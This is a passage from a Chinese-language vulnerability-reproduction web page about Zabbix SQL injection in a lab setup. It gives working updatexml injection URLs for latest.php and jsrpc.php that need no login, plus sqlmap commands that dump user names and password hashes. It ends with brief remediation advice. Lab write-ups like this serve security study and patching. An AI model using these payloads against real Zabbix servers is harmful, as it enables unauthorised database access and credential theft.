+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python sqlmap.py -r ../1.txt --batch -D zabbix -T users -C name,passwd --dump</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/11c3edb28cd57e4ad711eeba60f1d2f4.png" alt=""  loading="lazy" />
+可以看到有一个空用户是空密码，很可能对应的就是guest用户，还有一个Zabbix用户，密码是zabbix</p>
+<h5>不登录任何用户<span class="hx:absolute hx:-mt-20" id="不登录任何用户"></span>
+    <a href="#%e4%b8%8d%e7%99%bb%e5%bd%95%e4%bb%bb%e4%bd%95%e7%94%a8%e6%88%b7" class="subheading-anchor" aria-label="Permalink for this section"></a></h5><p>
+    <img src="../imgs/ded43fb7a68c898ea0f0126770d6b2b0.png" alt=""  loading="lazy" /></p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><pre><code>ee88e5e194957d1a</code></pre></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>将这16个字符作为sid的值，访问<code>http://your-ip:8080/latest.php?output=ajax&amp;sid=填写后16位&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=报错注入语句</code></p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><pre><code>http://192.168.79.111:8080/latest.php?output=ajax&amp;sid=ee88e5e194957d1a&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0x7e,version()),0)</code></pre></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/eed75e425a745b4fff9afd18b23ea0e0.png" alt=""  loading="lazy" />
+为什么不登录用户也可以呢？</p>
+<ol>
+<li>Zabbix 在用户访问登录页面时，就会自动在服务端创建一个会话并向浏览器发放一个 <code>zbx_sessionid</code>。即使此时你尚未输入用户名密码，这个 Session ID 已经是一个“合法”的 ID。</li>
+<li>在受影响的 Zabbix 版本中，<code>latest.php</code> 等部分页面在处理带有 <code>output=ajax</code> 的请求时，只校验了 <code>sid</code>（即 <code>zbx_sessionid</code>）是否在请求参数中，但没有校验这个 <code>sid</code> 是否已经通过了身份认证。</li>
+</ol>
+<h4>通过jsrpc.php触发sql注入<span class="hx:absolute hx:-mt-20" id="通过jsrpcphp触发sql注入"></span>
+    <a href="#%e9%80%9a%e8%bf%87jsrpcphp%e8%a7%a6%e5%8f%91sql%e6%b3%a8%e5%85%a5" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><p>这个漏洞还能通过jsrpc.php触发，且无需登录，只需要访问<code>http://your-ip:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=报错注入sql语句</code></p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><pre><code>http://192.168.79.111:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(0,concat(0x7e,database()),0)</code></pre></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/5cd83a8c25ea6e6809b402b5f0d02a96.png" alt=""  loading="lazy" />
+也可以尝试去使用sqlmap去自动化测试，同上这里不再详细演示
+&ndash;flush-session 清除缓存</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://192.168.79.111:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=*&#34;</span> --flush-session --batch</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/6d6694c854077d8875b1154122eec61f.png" alt=""  loading="lazy" />
+在这个页面，sqlmap还测出了布尔盲注，如果想学习sqlmap是怎么注入的可以加上-v 3
+&ndash;tech B 指定注入方式为布尔盲注，-v 3 显示所有的payload（攻击载荷）</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://192.168.79.111:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=*&#34;</span> --batch --tech B -v <span style="color:#ae81ff">3</span> --dbs</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/b5fe467a2ac0aed9d6204bf1e7941eb1.png" alt=""  loading="lazy" />
+
+    <img src="../imgs/af648407ecbc1d0c62009ec4855849bc.png" alt=""  loading="lazy" />
+看不懂也没关系，可以借助ai进行理解，学习，ai肯定能看懂
+
+    <img src="../imgs/74545fd57dfb4c9e7020a3e1b4fd1778.png" alt=""  loading="lazy" /></p>
+<h3>如何修复<span class="hx:absolute hx:-mt-20" id="如何修复-2"></span>
+    <a href="#%e5%a6%82%e4%bd%95%e4%bf%ae%e5%a4%8d-2" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Zabbix 官方在后续版本中通过以下方式修复了该问题：</p>
+<ul>
+<li>强化输入校验： 使用 <code>zbx_ctype_digit</code> 等函数强制检查 <code>toggle_ids</code> 必须为数字。</li>
+<li>改进数据库抽象层： 确保所有进入 <code>IN</code> 查询的数组元素都经过严格的转义或预编译处理。
+我们能做的就是立即升级 Zabbix 至安全版本。</li>
+</ul>
+
+        </div><div class="hx:mt-16"></div><div class="hx:mb-8 hx:flex hx:items-center hx:border-t hx:pt-8 hx:border-gray-200 hx:dark:border-neutral-800 hx:contrast-more:border-neutral-400 hx:dark:contrast-more:border-neutral-400 hx:print:hidden"><a
+        href="/vul/jenkins%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+        title="Jenkins历史漏洞复现"
+        class="hx:flex hx:max-w-[50%] hx:items-center hx:gap-1 hx:py-4 hx:text-base hx:font-medium hx:text-gray-600 hx:transition-colors [word-break:break-word] hx:hover:text-primary-600 hx:dark:text-gray-300 hx:md:text-lg hx:ltr:pr-4 hx:rtl:pl-4"
+      ><svg class="hx:inline hx:h-5 hx:shrink-0 hx:ltr:rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg>Jenkins历史漏洞复现</a></div></main>
+    </article>
+  </div>
+
+      <footer class="hextra-footer hx:bg-gray-100 hx:pb-[env(safe-area-inset-bottom)] hx:dark:bg-neutral-900 hx:print:bg-transparent"><div class="hextra-custom-footer hextra-max-footer-width hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400"></div><div
+      class="hextra-max-footer-width hx:mx-auto hx:flex hx:justify-center hx:py-12 hx:pl-[max(env(safe-area-inset-left),1.5rem)] hx:pr-[max(env(safe-area-inset-right),1.5rem)] hx:text-gray-600 hx:dark:text-gray-400 hx:md:justify-start"
+    >
+      <div class="hx:flex hx:w-full hx:flex-col hx:items-center hx:sm:items-start"><div class="hx:font-semibold"><a class="hx:flex hx:text-sm hx:items-center hx:gap-1 hx:text-current" target="_blank" rel="noopener noreferrer" title="Hextra GitHub Homepage" href="https://github.com/imfing/hextra">
+    <span>由 Hextra 驱动<svg height=1em class="hx:inline-block hx:ltr:ml-1 hx:rtl:mr-1 hx:align-[-2.5px]" viewBox="0 0 180 180" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="m 105.50024,22.224647 c -9.59169,-5.537563 -21.40871,-5.537563 -31.000093,0 L 39.054693,42.689119 C 29.463353,48.226675 23.55484,58.460531 23.55484,69.535642 v 40.928918 c 0,11.07542 5.908513,21.3092 15.499853,26.84652 l 35.445453,20.46446 c 9.591313,5.53732 21.408404,5.53732 31.000094,0 l 35.44507,-20.46446 c 9.59131,-5.53732 15.49985,-15.7711 15.49985,-26.84652 V 69.535642 c 0,-11.075111 -5.90854,-21.308967 -15.49985,-26.846523 z M 34.112797,85.737639 c -1.384445,2.397827 -1.384445,5.352099 0,7.749927 l 24.781554,42.922974 c 1.38437,2.39783 3.942853,3.87496 6.711592,3.87496 h 49.563107 c 2.76905,0 5.3273,-1.47713 6.71144,-3.87496 l 24.78194,-42.922974 c 1.38414,-2.397828 1.38414,-5.3521 0,-7.749927 L 121.88049,42.814746 c -1.38414,-2.397828 -3.94239,-3.874964 -6.71144,-3.874964 H 65.605944 c -2.768739,0 -5.327223,1.477059 -6.711592,3.874964 z" style="stroke-width:0.774993" /></svg></span>
+  </a></div></div>
+    </div></footer>
+    
+    <script defer src="/js/main.js" integrity=""></script>
+<script defer src="/js/flexsearch.9f5b5908f93ae86f1ecd4b043b799f580c2d1654e703dd9357d568ac41b2547a.js" integrity="sha256-n1tZCPk66G8ezUsEO3mfWAwtFlTnA92TV9VorEGyVHo=" crossorigin="anonymous"></script>
+        <script defer src="/en.search.js" integrity=""></script>
+  </body>
+</html>
